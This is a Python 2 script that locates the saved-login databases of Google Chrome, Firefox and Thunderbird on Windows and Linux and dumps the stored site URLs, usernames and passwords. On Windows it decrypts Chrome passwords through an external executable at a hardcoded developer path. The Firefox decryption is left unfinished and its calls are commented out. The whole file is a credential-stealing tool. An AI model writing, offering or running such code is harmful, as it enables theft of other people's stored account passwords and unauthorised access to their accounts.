#!/usr/bin/python

####
### Finds Google Chrome / Opera / Firefox login database
##  and decrypt them.
#
##
###
####

import getpass, platform, sqlite3, os, json, subprocess, base64

### Constants

GCHROME_LOGIN_FILE = "Login Data"
MOZ_LOGIN_FILE_DB = "signons.sqlite"
MOZ_LOGIN_FILE_JSON = "logins.json"

username = getpass.getuser()
opsys = platform.system()

GCHROME_PROFILE_WIN = "C:\Users\\" + username + "\AppData\Local\Google\Chrome\User Data\Default"
FF_PROFILE_WIN = "C:\Users\\" + username + "\AppData\Roaming\Mozilla\Firefox"
TH_PROFILE_WIN = "C:\Users\\" + username + "\AppData\Roaming\Thunderbird"

GCHROME_PROFILE_LINUX = "/home/" + username + "/.config/google-chrome/Default"
FF_PROFILE_LINUX = "/home/" + username + "/.mozilla/firefox"
TH_PROFILE_LINUX = "/home/" + username + "/.thunderbird"

WIN_DECRYPTER = "C:\\Users\\John\\Documents\\Visual Studio 2012\\Projects\\ConsoleApplication3\\Debug\\ConsoleApplication3.exe"

### End Constants

### Def

def getPasswords(loginFile):
	""" Select password from relative database """
	print "Opening " + loginFile
	conn = sqlite3.connect(loginFile)

	if loginFile is GCHROME_LOGIN_FILE:
		#chrome on windows, run Windows C application
		if opsys == "Windows":
			print "Attempting to decrypt Windows Chrome logins"

			query = "SELECT origin_url, username_value, hex(password_value) FROM logins"
			
			for row in conn.execute(query):
				pwd = row[2]
				retval = subprocess.check_output([WIN_DECRYPTER, pwd])
				print retval

		#chrome on linux, clear text password or encrypted with key chain, simply return the value we found
		elif opsys == "Linux":
			query = "SELECT origin_url, username_value, quote(password_value) FROM logins"

			for row in conn.execute(query):
				print row

	elif loginFile is MOZ_LOGIN_FILE_DB:
		query = "SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins"

		#firefox/thunderbird on linux/windows, use NSS library to decrypt



def readLoginsJSON(loginFileJSON):
	""" Read the JSON of Firefox login data """
	data = json.loads(open(loginFileJSON).read())
	print data['logins'][0]['hostname'] + ", " + data['logins'][0]['encryptedUsername'] + ", " + data['logins'][0]['encryptedPassword']

def readMozillaLogins(sw, profileDir):
	""" Read and parse the login file of thunderbird or firefox """
	
	print "===> Attempting to read " + sw + " login file"

	#get first default profile directory
	os.chdir(profileDir)

	#open and read profiles.ini
	profiles = open("profiles.ini", "r")
	
	for line in profiles:
		# get profile directory
		if line.startswith("Path="): 
			p = line.split("=")[1].strip("\n")
			print "Found profile directory " + p
			os.chdir(p)

			# look for signons.sqlite
			getPasswords(MOZ_LOGIN_FILE_DB) if os.path.isfile(MOZ_LOGIN_FILE_DB) else None
			
			# look for logins.json
			readLoginsJSON(MOZ_LOGIN_FILE_JSON) if os.path.isfile(MOZ_LOGIN_FILE_JSON) else None
			
			#go up one directory
			os.chdir(os.path.dirname(os.getcwd()))

### End Def

### Code

#detect os and look in specific folders
if opsys == "Linux":
	chromeProfile = GCHROME_PROFILE_LINUX
	ffProfile = FF_PROFILE_LINUX
	thProfile = TH_PROFILE_LINUX
elif opsys == "Windows":
	chromeProfile = GCHROME_PROFILE_WIN
	ffProfile = FF_PROFILE_WIN
	thProfile = TH_PROFILE_WIN

#google-chrome
os.chdir(chromeProfile)
print "===> Attempting to read chrome login file"
getPasswords(GCHROME_LOGIN_FILE)

#firefox & thunderbird
#readMozillaLogins("firefox", ffProfile)
#readMozillaLogins("thunderbird", thProfile)

### End Code
